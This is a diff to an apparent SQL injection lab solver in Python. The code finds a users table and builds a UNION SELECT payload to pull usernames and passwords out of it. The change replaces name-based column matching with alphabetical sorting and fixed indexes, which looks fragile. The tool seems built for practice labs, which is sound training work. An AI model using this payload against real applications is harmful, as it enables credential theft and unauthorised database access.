@@ -144,7 +144,7 @@ class SQLInjectionBaseSolver(ABC):
         self._request_lab('GET', url_brute)
         td_html = self.soup_html.find_all('td')
         for td in td_html:
-            if 'users' in td.text or 'USERS' in td.text:
+            if 'users' in td.text or td.text.startswith('USERS'):
                 self.spinner.stop()
                 self.table_name = td.text
                 self.console.log(f"[bold blue]Table Name:[/bold blue] {self.table_name}")
@@ -174,12 +174,8 @@ class SQLInjectionBaseSolver(ABC):
         self.spinner.start()
         self.spinner.text = 'Retrieve the Data'
         null = 'NULL,' * (self.total_columns-2)
-        for column in self.column_name:
-            if 'username' in column or 'USERNAME' in column:
-                self.column_name[1] = column
-            elif 'password' in column or 'PASSWORD' in column:
-                self.column_name[2] = column
-        payload = f"' UNION SELECT {null}{self.column_name[1]},{self.column_name[2]} FROM {self.table_name}-- -"
+        self.column_name = sorted(self.column_name)
+        payload = f"' UNION SELECT {null}{self.column_name[2]},{self.column_name[1]} FROM {self.table_name}-- -"
         url_brute = self.url + self.categories_url[1] + payload
         self._request_lab('GET', url_brute)
         td_html = self.soup_html.find_all('td')
